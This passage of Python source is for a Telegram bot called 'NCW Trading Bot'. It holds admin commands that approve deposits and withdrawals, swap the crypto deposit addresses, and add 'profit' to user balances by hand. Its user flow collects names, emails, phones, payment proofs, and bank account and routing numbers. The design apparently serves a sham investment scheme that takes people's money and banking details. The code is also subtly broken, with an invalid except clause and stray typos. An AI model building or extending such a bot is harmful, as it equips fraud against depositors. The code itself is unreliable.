            return
        
        crypto_name = args[0].title()
        address = args[1]
        
        if crypto_name not in crypto_addresses:
            await update.message.reply_text(f"❌ Crypto {crypto_name} not found. Available: {', '.join(crypto_addresses.keys())}")
            return
        
        crypto_addresses[crypto_name] = address
        await update.message.reply_text(f"✅ Updated {crypto_name} address to: {address}")
        
    except IndexError:
        await update.message.reply_text("❌ Invalid format. Usage: /updatecrypto <crypto_name> <address>")

async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to approve user accounts"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("ID❌ Unauthorized access.")
        return
    
    try:
        args = context.args
        if len(args) != 1:
            await update.message.reply_text("Usage: /approveuser <user_id>")
            return
        
        user_id = int(args[0])
        
        if user_id not in user_data:
            await update.message.reply_text("❌ User not found.")
            return
        
        user_info = user_data[user_id]
        user_info['approved'] = True
        
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now visit our site and use all trading features."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {user_id}: {e}")
        
        await update.message.reply_text(f"✅ Approved user {user_id} ({user_info['name']}).")
        
    except ValueError, (IndexError, IndexError):
        await update.message.reply_text("❌ Invalid format. Usage: /approveuser <user_id>")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to list all users"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    if not user_data:
        await update.message.reply_text("📝 No users registered yet.")
        return
    
    users_list = """👥 **Registered Users** 👥

Below is a detailed list of all registered users:\n\n"""
    for user_id, data in user_data.items():
        status = "✅ Approved" if data['approved'] else "⏳ Pending"
        bot = data['active_bot'] if data['active_bot'] else "None"
        pending_dep = f"${data['pending_deposit']:.2f}" if data['pending_deposit'] > 0 else "None"
        pending_with = f"${data['pending_withdrawal']:.2f}" if data['pending_withdrawal'] > 0 else "None"
        
        users_list += f"🆔 **{user_id}** - {data['name']}\n"
        users_list += f"📧 {data['email']}\n"
        users_list += f"📱 {data['phone']}\n"
        users_list += f"💰 Balance: ${data['balance']:.2f}\n"
        users_list += f"📈 Deposit: ${data['deposit']:.2f}\n"
        users_list += f"📊 Profit: ${data['profit']:.2f}\n"
        users_list += f"📉 Withdrawal: ${data['withdrawal']:.2f}\n"
        users_list += f"📊 Status: {status}\n"
        users_list += f"🤖 Active Bot: {bot}\n"
        users_list += f"💳 Pending Deposit: {pending_dep}\n"
        users_list += f"💸 Pending Withdrawal: {pending_with}\n"
        users_list += "━━━━━━━━━━━━━━━━━━━━\n"
    
    if len(users_list) > 4000:
        parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
        for part in parts:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=part,
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text(users_list, parse_mode='Markdown')

async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show admin commands"""
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("❌ Unauthorized access.")
        return
    
    help_text = """🛠 **Admin Panel Guide** 🛠

Welcome to the NCW Trading Bot Admin Panel. Below are the available actions and how to use them:

👥 **List Users**
- View all registered users with details (ID, name, email, balance, etc.).
- Use the 'List Users' button or /listusers.

✅ **Approve User**
- Approve a user's account to grant access to trading features.
- Command: /approveuser <user_id>
- Example: /approveuser 123456789

💳 **Approve Deposit**
- Confirm a user's deposit to update their balance.
- Command: /approve <user_id> <amount>
- Example: /approve 123456789 1000.50
- Alternatively, use the 'Approve' button in deposit notifications.

💸 **Approve Withdrawal**
- Process a user's withdrawal.
- Command: /approvewithdrawal <user_id> <amount>
- Example: /approvewithdrawal 123456789 500.25

📈 **Update Profit**
- Add profit to a user's account based on trading bot performance.
- Command: /updateprofit <user_id> <amount>
- Example: /updateprofit 123456789 250.75

🪙 **Update Crypto Address**
- Change the wallet address for a cryptocurrency.
- Command: /updatecrypto <crypto_name> <address>
- Example: /updatecrypto Bitcoin 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

ℹ️ **Help**
- Review this guide anytime with /adminhelp or time the 'Help' button.

**Tips:**
- Use /getid to find a user's ID.
- Check deposit notifications for pending approvals.
- All commands are case-sensitive."""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle errors"""
    logger.error(f"Update {update} caused error {context.error}")
    
    if update and update.effective_message:
        await update.effective_message.reply_text(
            "⚠️ An error occurred. Please try again or contact support if the problem persists."
        )

def main() -> None:
    """Start the bot"""
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN environment variable not set!")
        return
    
    if not ADMIN_USER_ID:
        logger.error("ADMIN_USER_ID environment variable not set!")
        return
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            CommandHandler("adminpanel", admin_panel),
        ],
        states={
            WAITING_NAME: [
                CallbackQueryHandler(start_registration, pattern='^start_registration$'),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_name),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WAITING_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_email),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WAITING_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            MAIN_MENU: [
                CallbackQueryHandler(show_main_menu, pattern='^proceed_to_menu$'),
                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'),
                CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'),
                CallbackQueryHandler(visit_website, pattern='^visit_website$'),
                CallbackQueryHandler(handle_deposit, pattern='^deposit$'),
                CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'),
                CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'),
                CallbackQueryHandler(copy_address, pattern='^copy_address_'),
                CallbackQueryHandler(payment_made, pattern='^payment_made$'),
                CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'),
                CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
                CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'),
                CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'),
                CallbackQueryHandler(show_copy_trade, pattern='^copy_trade$'),
                CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'),
                CallbackQueryHandler(handle_stake, pattern='^stake$'),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
                CallbackQueryHandler(handle_admin_action, pattern='^admin_'),
            ],
            DEPOSIT_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_deposit_amount),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            DEPOSIT_PROOF: [
                MessageHandler(filters.PHOTO, get_deposit_proof),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_CRYPTO_ADDRESS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_crypto_address),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_BANK_NAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_bank_name),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_ACCOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_account_number),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
            WITHDRAW_ROUTING: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_routing_number),
                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
            ],
        },
        fallbacks=[
            CommandHandler("start", start),
            CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
        ],
        per_message=False
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("getid", get_id))
    application.add_handler(CommandHandler("approve", approve_deposit))
    application.add_handler(CommandHandler("approvewithdrawal", approve_withdrawal))
    application.add_handler(CommandHandler("updateprofit", update_profit))
    application.add_handler(CommandHandler("updatecrypto", update_crypto_address))
    application.add_handler(CommandHandler("approveuser", approve_user))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("adminhelp", admin_help))
    
    application.add_error_handler(error_handler)
    
    logger.info("Starting NCW Trading Bot...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()